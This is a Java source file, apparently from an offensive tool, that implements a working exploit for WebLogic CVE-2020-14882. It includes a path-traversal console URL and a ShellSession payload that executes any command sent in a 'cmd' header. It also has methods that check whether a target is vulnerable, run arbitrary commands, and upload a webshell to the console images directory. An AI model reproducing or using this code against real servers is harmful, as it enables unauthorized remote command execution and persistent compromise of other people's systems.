package fun.fireline.exp.oracle.weblogic;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/3/25 22:49
 * @github https://github.com/yhy0
 * 编写EXP 示例文件
 * Weblogic 未授权命令执行
 */

public class CVE_2020_14882 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private  HashMap<String, String> headers = new HashMap();

    private static final String VULURL = "/console/css/%252e%252e%252fconsole.portal";
    private static final String PAYLOAD = ("_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\"); String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd}; if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(\"\"); }executeThread.interrupt(); \");");


    @Override
    public String checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        this.headers.put("cmd", "echo " + uuid);

        Response response = HttpTools.post(this.target + VULURL, PAYLOAD, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding)  {

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        this.headers.put("cmd", cmd);
        Response response = HttpTools.post(this.target + VULURL, PAYLOAD, headers, encoding);
        return response.getText();

    }

    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        // 因为使用echo 写 shell ，这里需要对 < > 转义
        String shell_info = Tools.get_escape_shell(fileContent, platform);

        String path = this.getWebPath();

        String cmd = String.format("echo %s > %s", shell_info, path + filename);
        String str = this.exeCmd(cmd, "UTF-8");

        if(this.target.endsWith("/")) {
            return this.target + "console/images/" + filename;
        } else {
            return this.target + "/console/images/" + filename;
        }

    }

    public String getWebPath() {
        // 根据不同的服务，查找对应的web路径

        // 这个CVE-2020-14882 我直接写死 路径 演示使用

        return "../../../wlserver/server/lib/consoleapp/webapp/images/";
    }

    public boolean isVul() {
        return this.isVul;
    }
}
